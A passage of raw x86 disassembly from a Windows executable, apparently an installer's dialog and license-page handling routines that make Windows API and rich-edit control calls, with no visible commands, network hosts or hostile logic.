  4041b0:	6a 1c                	push   $0x1c
  4041b2:	57                   	push   %edi
  4041b3:	a3 d0 0e 42 00       	mov    %eax,0x420ed0
  4041b8:	e8 4b 03 00 00       	call   0x404508
  4041bd:	ff 35 08 8a 42 00    	push   0x428a08
  4041c3:	6a f2                	push   $0xfffffff2
  4041c5:	57                   	push   %edi
  4041c6:	ff 15 dc 81 40 00    	call   *0x4081dc
  4041cc:	6a 04                	push   $0x4
  4041ce:	e8 38 d2 ff ff       	call   0x40140b
  4041d3:	a3 ec 89 42 00       	mov    %eax,0x4289ec
  4041d8:	33 c0                	xor    %eax,%eax
  4041da:	40                   	inc    %eax
  4041db:	a3 f0 2e 42 00       	mov    %eax,0x422ef0
  4041e0:	8b 0d 60 a3 40 00    	mov    0x40a360,%ecx
  4041e6:	33 ed                	xor    %ebp,%ebp
  4041e8:	8b f1                	mov    %ecx,%esi
  4041ea:	c1 e6 06             	shl    $0x6,%esi
  4041ed:	03 35 40 9a 42 00    	add    0x429a40,%esi
  4041f3:	3b cd                	cmp    %ebp,%ecx
  4041f5:	7c 3e                	jl     0x404235
  4041f7:	83 f8 01             	cmp    $0x1,%eax
  4041fa:	75 31                	jne    0x40422d
  4041fc:	55                   	push   %ebp
  4041fd:	ff 76 10             	push   0x10(%esi)
  404200:	e8 84 d1 ff ff       	call   0x401389
  404205:	85 c0                	test   %eax,%eax
  404207:	74 24                	je     0x40422d
  404209:	6a 01                	push   $0x1
  40420b:	55                   	push   %ebp
  40420c:	68 0f 04 00 00       	push   $0x40f
  404211:	ff 35 f8 89 42 00    	push   0x4289f8
  404217:	ff 15 58 82 40 00    	call   *0x408258
  40421d:	33 c0                	xor    %eax,%eax
  40421f:	39 2d ec 89 42 00    	cmp    %ebp,0x4289ec
  404225:	0f 94 c0             	sete   %al
  404228:	e9 aa 02 00 00       	jmp    0x4044d7
  40422d:	39 2e                	cmp    %ebp,(%esi)
  40422f:	0f 84 a0 02 00 00    	je     0x4044d5
  404235:	68 0b 04 00 00       	push   $0x40b
  40423a:	e8 15 03 00 00       	call   0x404554
  40423f:	a1 f0 2e 42 00       	mov    0x422ef0,%eax
  404244:	01 05 60 a3 40 00    	add    %eax,0x40a360
  40424a:	c1 e0 06             	shl    $0x6,%eax
  40424d:	03 f0                	add    %eax,%esi
  40424f:	a1 60 a3 40 00       	mov    0x40a360,%eax
  404254:	3b 05 44 9a 42 00    	cmp    0x429a44,%eax
  40425a:	75 07                	jne    0x404263
  40425c:	6a 01                	push   $0x1
  40425e:	e8 a8 d1 ff ff       	call   0x40140b
  404263:	39 2d ec 89 42 00    	cmp    %ebp,0x4289ec
  404269:	0f 85 24 02 00 00    	jne    0x404493
  40426f:	a1 44 9a 42 00       	mov    0x429a44,%eax
  404274:	39 05 60 a3 40 00    	cmp    %eax,0x40a360
  40427a:	0f 83 13 02 00 00    	jae    0x404493
  404280:	ff 76 24             	push   0x24(%esi)
  404283:	8b 5e 14             	mov    0x14(%esi),%ebx
  404286:	68 00 90 43 00       	push   $0x439000
  40428b:	e8 36 23 00 00       	call   0x4065c6
  404290:	ff 76 20             	push   0x20(%esi)
  404293:	68 19 fc ff ff       	push   $0xfffffc19
  404298:	57                   	push   %edi
  404299:	e8 6a 02 00 00       	call   0x404508
  40429e:	ff 76 1c             	push   0x1c(%esi)
  4042a1:	68 1b fc ff ff       	push   $0xfffffc1b
  4042a6:	57                   	push   %edi
  4042a7:	e8 5c 02 00 00       	call   0x404508
  4042ac:	ff 76 28             	push   0x28(%esi)
  4042af:	68 1a fc ff ff       	push   $0xfffffc1a
  4042b4:	57                   	push   %edi
  4042b5:	e8 4e 02 00 00       	call   0x404508
  4042ba:	6a 03                	push   $0x3
  4042bc:	57                   	push   %edi
  4042bd:	ff 15 3c 82 40 00    	call   *0x40823c
  4042c3:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  4042c9:	89 44 24 30          	mov    %eax,0x30(%esp)
  4042cd:	74 08                	je     0x4042d7
  4042cf:	66 81 e3 fd fe       	and    $0xfefd,%bx
  4042d4:	83 cb 04             	or     $0x4,%ebx
  4042d7:	8b cb                	mov    %ebx,%ecx
  4042d9:	83 e1 08             	and    $0x8,%ecx
  4042dc:	51                   	push   %ecx
  4042dd:	50                   	push   %eax
  4042de:	ff 15 28 82 40 00    	call   *0x408228
  4042e4:	8b c3                	mov    %ebx,%eax
  4042e6:	25 00 01 00 00       	and    $0x100,%eax
  4042eb:	50                   	push   %eax
  4042ec:	ff 74 24 34          	push   0x34(%esp)
  4042f0:	ff 15 50 82 40 00    	call   *0x408250
  4042f6:	8b c3                	mov    %ebx,%eax
  4042f8:	83 e0 02             	and    $0x2,%eax
  4042fb:	50                   	push   %eax
  4042fc:	e8 29 02 00 00       	call   0x40452a
  404301:	83 e3 04             	and    $0x4,%ebx
  404304:	53                   	push   %ebx
  404305:	ff 35 d0 0e 42 00    	push   0x420ed0
  40430b:	ff 15 50 82 40 00    	call   *0x408250
  404311:	3b dd                	cmp    %ebp,%ebx
  404313:	74 03                	je     0x404318
  404315:	55                   	push   %ebp
  404316:	eb 02                	jmp    0x40431a
  404318:	6a 01                	push   $0x1
  40431a:	68 60 f0 00 00       	push   $0xf060
  40431f:	55                   	push   %ebp
  404320:	57                   	push   %edi
  404321:	ff 15 e0 81 40 00    	call   *0x4081e0
  404327:	50                   	push   %eax
  404328:	ff 15 e4 81 40 00    	call   *0x4081e4
  40432e:	8b 1d 58 82 40 00    	mov    0x408258,%ebx
  404334:	6a 01                	push   $0x1
  404336:	55                   	push   %ebp
  404337:	68 f4 00 00 00       	push   $0xf4
  40433c:	ff 74 24 3c          	push   0x3c(%esp)
  404340:	ff d3                	call   *%ebx
  404342:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  404348:	74 13                	je     0x40435d
  40434a:	55                   	push   %ebp
  40434b:	6a 02                	push   $0x2
  40434d:	68 01 04 00 00       	push   $0x401
  404352:	57                   	push   %edi
  404353:	ff d3                	call   *%ebx
  404355:	ff 35 d0 0e 42 00    	push   0x420ed0
  40435b:	eb 06                	jmp    0x404363
  40435d:	ff 35 04 2f 42 00    	push   0x422f04
  404363:	e8 d5 01 00 00       	call   0x40453d
  404368:	e8 7d fc ff ff       	call   0x403fea
  40436d:	bb 08 2f 42 00       	mov    $0x422f08,%ebx
  404372:	50                   	push   %eax
  404373:	53                   	push   %ebx
  404374:	e8 10 22 00 00       	call   0x406589
  404379:	ff 76 18             	push   0x18(%esi)
  40437c:	53                   	push   %ebx
  40437d:	e8 1d 22 00 00       	call   0x40659f
  404382:	8d 04 45 08 2f 42 00 	lea    0x422f08(,%eax,2),%eax
  404389:	50                   	push   %eax
  40438a:	e8 37 22 00 00       	call   0x4065c6
  40438f:	53                   	push   %ebx
  404390:	57                   	push   %edi
  404391:	ff 15 1c 82 40 00    	call   *0x40821c
  404397:	55                   	push   %ebp
  404398:	ff 76 08             	push   0x8(%esi)
  40439b:	e8 e9 cf ff ff       	call   0x401389
  4043a0:	85 c0                	test   %eax,%eax
  4043a2:	0f 85 97 fe ff ff    	jne    0x40423f
  4043a8:	39 2e                	cmp    %ebp,(%esi)
  4043aa:	0f 84 8f fe ff ff    	je     0x40423f
  4043b0:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  4043b4:	75 1d                	jne    0x4043d3
  4043b6:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  4043bc:	0f 85 13 01 00 00    	jne    0x4044d5
  4043c2:	39 2d a0 9a 42 00    	cmp    %ebp,0x429aa0
  4043c8:	0f 85 71 fe ff ff    	jne    0x40423f
  4043ce:	e9 02 01 00 00       	jmp    0x4044d5
  4043d3:	ff 35 f8 89 42 00    	push   0x4289f8
  4043d9:	ff 15 10 82 40 00    	call   *0x408210
  4043df:	89 35 e0 1e 42 00    	mov    %esi,0x421ee0
  4043e5:	39 2e                	cmp    %ebp,(%esi)
  4043e7:	0f 8e c5 00 00 00    	jle    0x4044b2
  4043ed:	8b 46 04             	mov    0x4(%esi),%eax
  4043f0:	56                   	push   %esi
  4043f1:	ff 34 85 64 a3 40 00 	push   0x40a364(,%eax,4)
  4043f8:	66 8b 06             	mov    (%esi),%ax
  4043fb:	66 03 05 00 8a 42 00 	add    0x428a00,%ax
  404402:	57                   	push   %edi
  404403:	0f b7 c0             	movzwl %ax,%eax
  404406:	50                   	push   %eax
  404407:	ff 35 20 9a 42 00    	push   0x429a20
  40440d:	ff 15 14 82 40 00    	call   *0x408214
  404413:	3b c5                	cmp    %ebp,%eax
  404415:	a3 f8 89 42 00       	mov    %eax,0x4289f8
  40441a:	0f 84 92 00 00 00    	je     0x4044b2
  404420:	ff 76 2c             	push   0x2c(%esi)
  404423:	6a 06                	push   $0x6
  404425:	50                   	push   %eax
  404426:	e8 dd 00 00 00       	call   0x404508
  40442b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40442f:	50                   	push   %eax
  404430:	68 fa 03 00 00       	push   $0x3fa
  404435:	57                   	push   %edi
  404436:	ff 15 3c 82 40 00    	call   *0x40823c
  40443c:	50                   	push   %eax
  40443d:	ff 15 e8 81 40 00    	call   *0x4081e8
  404443:	8d 44 24 10          	lea    0x10(%esp),%eax
  404447:	50                   	push   %eax
  404448:	57                   	push   %edi
  404449:	ff 15 ec 81 40 00    	call   *0x4081ec
  40444f:	6a 15                	push   $0x15
  404451:	55                   	push   %ebp
  404452:	55                   	push   %ebp
  404453:	ff 74 24 20          	push   0x20(%esp)
  404457:	ff 74 24 20          	push   0x20(%esp)
  40445b:	55                   	push   %ebp
  40445c:	ff 35 f8 89 42 00    	push   0x4289f8
  404462:	ff 15 d0 81 40 00    	call   *0x4081d0
  404468:	55                   	push   %ebp
  404469:	ff 76 0c             	push   0xc(%esi)
  40446c:	e8 18 cf ff ff       	call   0x401389
  404471:	39 2d ec 89 42 00    	cmp    %ebp,0x4289ec
  404477:	75 5c                	jne    0x4044d5
  404479:	6a 08                	push   $0x8
  40447b:	ff 35 f8 89 42 00    	push   0x4289f8
  404481:	ff 15 28 82 40 00    	call   *0x408228
  404487:	68 05 04 00 00       	push   $0x405
  40448c:	e8 c3 00 00 00       	call   0x404554
  404491:	eb 1f                	jmp    0x4044b2
  404493:	ff 35 f8 89 42 00    	push   0x4289f8
  404499:	ff 15 10 82 40 00    	call   *0x408210
  40449f:	ff 35 d8 16 42 00    	push   0x4216d8
  4044a5:	89 2d 28 9a 42 00    	mov    %ebp,0x429a28
  4044ab:	57                   	push   %edi
  4044ac:	ff 15 f0 81 40 00    	call   *0x4081f0
  4044b2:	39 2d 08 4f 42 00    	cmp    %ebp,0x424f08
  4044b8:	75 1b                	jne    0x4044d5
  4044ba:	39 2d f8 89 42 00    	cmp    %ebp,0x4289f8
  4044c0:	74 13                	je     0x4044d5
  4044c2:	6a 0a                	push   $0xa
  4044c4:	57                   	push   %edi
  4044c5:	ff 15 28 82 40 00    	call   *0x408228
  4044cb:	c7 05 08 4f 42 00 01 	movl   $0x1,0x424f08
  4044d2:	00 00 00 
  4044d5:	33 c0                	xor    %eax,%eax
  4044d7:	5f                   	pop    %edi
  4044d8:	5e                   	pop    %esi
  4044d9:	5d                   	pop    %ebp
  4044da:	5b                   	pop    %ebx
  4044db:	83 c4 10             	add    $0x10,%esp
  4044de:	c2 10 00             	ret    $0x10
  4044e1:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  4044e6:	75 06                	jne    0x4044ee
  4044e8:	ff 05 ec 89 42 00    	incl   0x4289ec
  4044ee:	6a 00                	push   $0x0
  4044f0:	ff 74 24 08          	push   0x8(%esp)
  4044f4:	68 08 04 00 00       	push   $0x408
  4044f9:	ff 35 28 9a 42 00    	push   0x429a28
  4044ff:	ff 15 58 82 40 00    	call   *0x408258
  404505:	c2 04 00             	ret    $0x4
  404508:	ff 74 24 0c          	push   0xc(%esp)
  40450c:	6a 00                	push   $0x0
  40450e:	e8 b3 20 00 00       	call   0x4065c6
  404513:	50                   	push   %eax
  404514:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404518:	05 e8 03 00 00       	add    $0x3e8,%eax
  40451d:	50                   	push   %eax
  40451e:	ff 74 24 0c          	push   0xc(%esp)
  404522:	e8 a0 16 00 00       	call   0x405bc7
  404527:	c2 0c 00             	ret    $0xc
  40452a:	ff 74 24 04          	push   0x4(%esp)
  40452e:	ff 35 04 2f 42 00    	push   0x422f04
  404534:	ff 15 50 82 40 00    	call   *0x408250
  40453a:	c2 04 00             	ret    $0x4
  40453d:	6a 01                	push   $0x1
  40453f:	ff 74 24 08          	push   0x8(%esp)
  404543:	6a 28                	push   $0x28
  404545:	ff 35 28 9a 42 00    	push   0x429a28
  40454b:	ff 15 58 82 40 00    	call   *0x408258
  404551:	c2 04 00             	ret    $0x4
  404554:	a1 f8 89 42 00       	mov    0x4289f8,%eax
  404559:	85 c0                	test   %eax,%eax
  40455b:	74 0f                	je     0x40456c
  40455d:	6a 00                	push   $0x0
  40455f:	6a 00                	push   $0x0
  404561:	ff 74 24 0c          	push   0xc(%esp)
  404565:	50                   	push   %eax
  404566:	ff 15 58 82 40 00    	call   *0x408258
  40456c:	c2 04 00             	ret    $0x4
  40456f:	55                   	push   %ebp
  404570:	8b ec                	mov    %esp,%ebp
  404572:	83 ec 0c             	sub    $0xc,%esp
  404575:	8b 45 08             	mov    0x8(%ebp),%eax
  404578:	56                   	push   %esi
  404579:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  40457e:	83 f8 05             	cmp    $0x5,%eax
  404581:	0f 87 b0 00 00 00    	ja     0x404637
  404587:	6a eb                	push   $0xffffffeb
  404589:	ff 75 10             	push   0x10(%ebp)
  40458c:	ff 15 d4 81 40 00    	call   *0x4081d4
  404592:	8b f0                	mov    %eax,%esi
  404594:	85 f6                	test   %esi,%esi
  404596:	0f 84 9b 00 00 00    	je     0x404637
  40459c:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4045a0:	0f 87 91 00 00 00    	ja     0x404637
  4045a6:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4045aa:	0f 87 87 00 00 00    	ja     0x404637
  4045b0:	8b 4e 14             	mov    0x14(%esi),%ecx
  4045b3:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4045b9:	75 7c                	jne    0x404637
  4045bb:	8b 06                	mov    (%esi),%eax
  4045bd:	57                   	push   %edi
  4045be:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  4045c4:	f6 c1 02             	test   $0x2,%cl
  4045c7:	74 03                	je     0x4045cc
  4045c9:	50                   	push   %eax
  4045ca:	ff d7                	call   *%edi
  4045cc:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  4045d0:	74 0a                	je     0x4045dc
  4045d2:	50                   	push   %eax
  4045d3:	ff 75 0c             	push   0xc(%ebp)
  4045d6:	ff 15 64 80 40 00    	call   *0x408064
  4045dc:	ff 76 10             	push   0x10(%esi)
  4045df:	ff 75 0c             	push   0xc(%ebp)
  4045e2:	ff 15 60 80 40 00    	call   *0x408060
  4045e8:	8b 46 04             	mov    0x4(%esi),%eax
  4045eb:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  4045ef:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4045f2:	74 06                	je     0x4045fa
  4045f4:	50                   	push   %eax
  4045f5:	ff d7                	call   *%edi
  4045f7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4045fa:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  4045fe:	5f                   	pop    %edi
  4045ff:	74 0a                	je     0x40460b
  404601:	50                   	push   %eax
  404602:	ff 75 0c             	push   0xc(%ebp)
  404605:	ff 15 4c 80 40 00    	call   *0x40804c
  40460b:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  40460f:	74 21                	je     0x404632
  404611:	8b 46 08             	mov    0x8(%esi),%eax
  404614:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404617:	8b 46 0c             	mov    0xc(%esi),%eax
  40461a:	85 c0                	test   %eax,%eax
  40461c:	74 07                	je     0x404625
  40461e:	50                   	push   %eax
  40461f:	ff 15 54 80 40 00    	call   *0x408054
  404625:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404628:	50                   	push   %eax
  404629:	ff 15 58 80 40 00    	call   *0x408058
  40462f:	89 46 0c             	mov    %eax,0xc(%esi)
  404632:	8b 46 0c             	mov    0xc(%esi),%eax
  404635:	eb 02                	jmp    0x404639
  404637:	33 c0                	xor    %eax,%eax
  404639:	5e                   	pop    %esi
  40463a:	c9                   	leave
  40463b:	c2 0c 00             	ret    $0xc
  40463e:	55                   	push   %ebp
  40463f:	8b ec                	mov    %esp,%ebp
  404641:	8b 45 10             	mov    0x10(%ebp),%eax
  404644:	8b 0d d4 0e 42 00    	mov    0x420ed4,%ecx
  40464a:	d1 e8                	shr    $1,%eax
  40464c:	50                   	push   %eax
  40464d:	8b 45 08             	mov    0x8(%ebp),%eax
  404650:	03 c8                	add    %eax,%ecx
  404652:	51                   	push   %ecx
  404653:	ff 75 0c             	push   0xc(%ebp)
  404656:	ff 15 98 80 40 00    	call   *0x408098
  40465c:	ff 75 0c             	push   0xc(%ebp)
  40465f:	ff 15 9c 80 40 00    	call   *0x40809c
  404665:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404668:	03 c0                	add    %eax,%eax
  40466a:	89 01                	mov    %eax,(%ecx)
  40466c:	01 05 d4 0e 42 00    	add    %eax,0x420ed4
  404672:	33 c0                	xor    %eax,%eax
  404674:	5d                   	pop    %ebp
  404675:	c2 10 00             	ret    $0x10
  404678:	55                   	push   %ebp
  404679:	8b ec                	mov    %esp,%ebp
  40467b:	a1 d4 0e 42 00       	mov    0x420ed4,%eax
  404680:	56                   	push   %esi
  404681:	8b 75 08             	mov    0x8(%ebp),%esi
  404684:	8d 04 46             	lea    (%esi,%eax,2),%eax
  404687:	50                   	push   %eax
  404688:	ff 15 9c 80 40 00    	call   *0x40809c
  40468e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404691:	d1 e9                	shr    $1,%ecx
  404693:	3b c1                	cmp    %ecx,%eax
  404695:	72 02                	jb     0x404699
  404697:	8b c1                	mov    %ecx,%eax
  404699:	33 c9                	xor    %ecx,%ecx
  40469b:	51                   	push   %ecx
  40469c:	51                   	push   %ecx
  40469d:	ff 75 10             	push   0x10(%ebp)
  4046a0:	ff 75 0c             	push   0xc(%ebp)
  4046a3:	50                   	push   %eax
  4046a4:	a1 d4 0e 42 00       	mov    0x420ed4,%eax
  4046a9:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4046ac:	50                   	push   %eax
  4046ad:	51                   	push   %ecx
  4046ae:	51                   	push   %ecx
  4046af:	ff 15 94 80 40 00    	call   *0x408094
  4046b5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4046b8:	5e                   	pop    %esi
  4046b9:	89 01                	mov    %eax,(%ecx)
  4046bb:	01 05 d4 0e 42 00    	add    %eax,0x420ed4
  4046c1:	33 c0                	xor    %eax,%eax
  4046c3:	5d                   	pop    %ebp
  4046c4:	c2 10 00             	ret    $0x10
  4046c7:	55                   	push   %ebp
  4046c8:	8b ec                	mov    %esp,%ebp
  4046ca:	83 ec 0c             	sub    $0xc,%esp
  4046cd:	53                   	push   %ebx
  4046ce:	33 db                	xor    %ebx,%ebx
  4046d0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4046d7:	56                   	push   %esi
  4046d8:	57                   	push   %edi
  4046d9:	0f 85 1a 01 00 00    	jne    0x4047f9
  4046df:	8b 7d 14             	mov    0x14(%ebp),%edi
  4046e2:	8b 47 30             	mov    0x30(%edi),%eax
  4046e5:	3b c3                	cmp    %ebx,%eax
  4046e7:	7d 11                	jge    0x4046fa
  4046e9:	8b 0d fc 89 42 00    	mov    0x4289fc,%ecx
  4046ef:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4046f6:	2b c8                	sub    %eax,%ecx
  4046f8:	8b 01                	mov    (%ecx),%eax
  4046fa:	8b 0d 58 9a 42 00    	mov    0x429a58,%ecx
  404700:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  404703:	0f b7 08             	movzwl (%eax),%ecx
  404706:	40                   	inc    %eax
  404707:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40470a:	40                   	inc    %eax
  40470b:	83 f9 02             	cmp    $0x2,%ecx
  40470e:	89 45 14             	mov    %eax,0x14(%ebp)
  404711:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404714:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404717:	c7 45 fc 78 46 40 00 	movl   $0x404678,-0x4(%ebp)
  40471e:	74 07                	je     0x404727
  404720:	c7 45 fc 3e 46 40 00 	movl   $0x40463e,-0x4(%ebp)
  404727:	8b 47 14             	mov    0x14(%edi),%eax
  40472a:	ff 77 34             	push   0x34(%edi)
  40472d:	8b f0                	mov    %eax,%esi
  40472f:	83 e0 01             	and    $0x1,%eax
  404732:	f7 d6                	not    %esi
  404734:	c1 ee 05             	shr    $0x5,%esi
  404737:	6a 22                	push   $0x22
  404739:	83 e6 01             	and    $0x1,%esi
  40473c:	ff 75 08             	push   0x8(%ebp)
  40473f:	0b f0                	or     %eax,%esi
  404741:	e8 c2 fd ff ff       	call   0x404508
  404746:	ff 77 38             	push   0x38(%edi)
  404749:	6a 23                	push   $0x23
  40474b:	ff 75 08             	push   0x8(%ebp)
  40474e:	e8 b5 fd ff ff       	call   0x404508
  404753:	33 c0                	xor    %eax,%eax
  404755:	3b f3                	cmp    %ebx,%esi
  404757:	0f 94 c0             	sete   %al
  40475a:	05 0a 04 00 00       	add    $0x40a,%eax
  40475f:	6a 01                	push   $0x1
  404761:	50                   	push   %eax
  404762:	ff 75 08             	push   0x8(%ebp)
  404765:	ff 15 c0 81 40 00    	call   *0x4081c0
  40476b:	56                   	push   %esi
  40476c:	e8 b9 fd ff ff       	call   0x40452a
  404771:	68 e8 03 00 00       	push   $0x3e8
  404776:	ff 75 08             	push   0x8(%ebp)
  404779:	ff 15 3c 82 40 00    	call   *0x40823c
  40477f:	8b f8                	mov    %eax,%edi
  404781:	57                   	push   %edi
  404782:	e8 b6 fd ff ff       	call   0x40453d
  404787:	8b 35 58 82 40 00    	mov    0x408258,%esi
  40478d:	53                   	push   %ebx
  40478e:	6a 01                	push   $0x1
  404790:	68 5b 04 00 00       	push   $0x45b
  404795:	57                   	push   %edi
  404796:	ff d6                	call   *%esi
  404798:	a1 30 9a 42 00       	mov    0x429a30,%eax
  40479d:	8b 40 68             	mov    0x68(%eax),%eax
  4047a0:	3b c3                	cmp    %ebx,%eax
  4047a2:	7d 09                	jge    0x4047ad
  4047a4:	f7 d8                	neg    %eax
  4047a6:	50                   	push   %eax
  4047a7:	ff 15 cc 81 40 00    	call   *0x4081cc
  4047ad:	50                   	push   %eax
  4047ae:	53                   	push   %ebx
  4047af:	68 43 04 00 00       	push   $0x443
  4047b4:	57                   	push   %edi
  4047b5:	ff d6                	call   *%esi
  4047b7:	68 00 00 01 04       	push   $0x4010000
  4047bc:	53                   	push   %ebx
  4047bd:	68 45 04 00 00       	push   $0x445
  4047c2:	57                   	push   %edi
  4047c3:	ff d6                	call   *%esi
  4047c5:	ff 75 14             	push   0x14(%ebp)
  4047c8:	e8 d2 1d 00 00       	call   0x40659f
  4047cd:	50                   	push   %eax
  4047ce:	53                   	push   %ebx
  4047cf:	68 35 04 00 00       	push   $0x435
  4047d4:	57                   	push   %edi
  4047d5:	ff d6                	call   *%esi
  4047d7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4047da:	89 1d d4 0e 42 00    	mov    %ebx,0x420ed4
  4047e0:	50                   	push   %eax
  4047e1:	ff 75 0c             	push   0xc(%ebp)
  4047e4:	68 49 04 00 00       	push   $0x449
  4047e9:	57                   	push   %edi
  4047ea:	ff d6                	call   *%esi
  4047ec:	89 1d d4 0e 42 00    	mov    %ebx,0x420ed4
  4047f2:	33 c0                	xor    %eax,%eax
  4047f4:	e9 52 01 00 00       	jmp    0x40494b
  4047f9:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404800:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404806:	75 5b                	jne    0x404863
  404808:	8b 45 10             	mov    0x10(%ebp),%eax
  40480b:	c1 e8 10             	shr    $0x10,%eax
  40480e:	66 85 c0             	test   %ax,%ax
  404811:	0f 85 25 01 00 00    	jne    0x40493c
  404817:	39 1d d4 0e 42 00    	cmp    %ebx,0x420ed4
  40481d:	0f 85 19 01 00 00    	jne    0x40493c
  404823:	a1 e0 1e 42 00       	mov    0x421ee0,%eax
  404828:	8d 78 14             	lea    0x14(%eax),%edi
  40482b:	f6 07 20             	testb  $0x20,(%edi)
  40482e:	0f 84 08 01 00 00    	je     0x40493c
  404834:	53                   	push   %ebx
  404835:	53                   	push   %ebx
  404836:	68 f0 00 00 00       	push   $0xf0
  40483b:	68 0a 04 00 00       	push   $0x40a
  404840:	ff 75 08             	push   0x8(%ebp)
  404843:	ff 15 3c 82 40 00    	call   *0x40823c
  404849:	50                   	push   %eax
  40484a:	ff d6                	call   *%esi
  40484c:	8b 0f                	mov    (%edi),%ecx
  40484e:	83 e0 01             	and    $0x1,%eax
  404851:	83 e1 fe             	and    $0xfffffffe,%ecx
  404854:	50                   	push   %eax
  404855:	0b c8                	or     %eax,%ecx
  404857:	89 0f                	mov    %ecx,(%edi)
  404859:	e8 cc fc ff ff       	call   0x40452a
  40485e:	e8 ef 00 00 00       	call   0x404952
  404863:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404867:	0f 85 c0 00 00 00    	jne    0x40492d
  40486d:	68 e8 03 00 00       	push   $0x3e8
  404872:	ff 75 08             	push   0x8(%ebp)
  404875:	ff 15 3c 82 40 00    	call   *0x40823c
  40487b:	8b 7d 14             	mov    0x14(%ebp),%edi
  40487e:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  404885:	75 67                	jne    0x4048ee
  404887:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  40488e:	75 5e                	jne    0x4048ee
  404890:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404893:	8b 57 18             	mov    0x18(%edi),%edx
  404896:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404899:	2b ca                	sub    %edx,%ecx
  40489b:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4048a1:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4048a4:	c7 45 fc c0 79 42 00 	movl   $0x4279c0,-0x4(%ebp)
  4048ab:	73 41                	jae    0x4048ee
  4048ad:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4048b0:	51                   	push   %ecx
  4048b1:	53                   	push   %ebx
  4048b2:	68 4b 04 00 00       	push   $0x44b
  4048b7:	50                   	push   %eax
  4048b8:	ff d6                	call   *%esi
  4048ba:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  4048c0:	68 02 7f 00 00       	push   $0x7f02
  4048c5:	53                   	push   %ebx
  4048c6:	ff d7                	call   *%edi
  4048c8:	50                   	push   %eax
  4048c9:	ff 15 c8 81 40 00    	call   *0x4081c8
  4048cf:	6a 01                	push   $0x1
  4048d1:	ff 75 fc             	push   -0x4(%ebp)
  4048d4:	ff 75 08             	push   0x8(%ebp)
  4048d7:	e8 9a 00 00 00       	call   0x404976
  4048dc:	68 00 7f 00 00       	push   $0x7f00
  4048e1:	53                   	push   %ebx
  4048e2:	ff d7                	call   *%edi
  4048e4:	50                   	push   %eax
  4048e5:	ff 15 c8 81 40 00    	call   *0x4081c8
  4048eb:	8b 7d 14             	mov    0x14(%ebp),%edi
  4048ee:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  4048f5:	75 48                	jne    0x40493f
  4048f7:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  4048fe:	75 3f                	jne    0x40493f
  404900:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404904:	75 10                	jne    0x404916
  404906:	53                   	push   %ebx
  404907:	6a 01                	push   $0x1
  404909:	68 11 01 00 00       	push   $0x111
  40490e:	ff 35 28 9a 42 00    	push   0x429a28
  404914:	ff d6                	call   *%esi
  404916:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  40491a:	75 0c                	jne    0x404928
  40491c:	53                   	push   %ebx
  40491d:	53                   	push   %ebx
  40491e:	6a 10                	push   $0x10
  404920:	ff 35 28 9a 42 00    	push   0x429a28
  404926:	ff d6                	call   *%esi
  404928:	33 c0                	xor    %eax,%eax
  40492a:	40                   	inc    %eax
  40492b:	eb 1e                	jmp    0x40494b
  40492d:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404934:	75 06                	jne    0x40493c
  404936:	ff 05 d4 0e 42 00    	incl   0x420ed4
  40493c:	8b 7d 14             	mov    0x14(%ebp),%edi
  40493f:	57                   	push   %edi
  404940:	ff 75 10             	push   0x10(%ebp)
  404943:	ff 75 0c             	push   0xc(%ebp)
  404946:	e8 24 fc ff ff       	call   0x40456f
  40494b:	5f                   	pop    %edi
  40494c:	5e                   	pop    %esi
  40494d:	5b                   	pop    %ebx
  40494e:	c9                   	leave
  40494f:	c2 10 00             	ret    $0x10
  404952:	83 3d ac 9a 42 00 00 	cmpl   $0x0,0x429aac
  404959:	a1 d0 0e 42 00       	mov    0x420ed0,%eax
  40495e:	75 05                	jne    0x404965
  404960:	a1 04 2f 42 00       	mov    0x422f04,%eax
  404965:	6a 01                	push   $0x1
  404967:	6a 01                	push   $0x1
  404969:	68 f4 00 00 00       	push   $0xf4
  40496e:	50                   	push   %eax
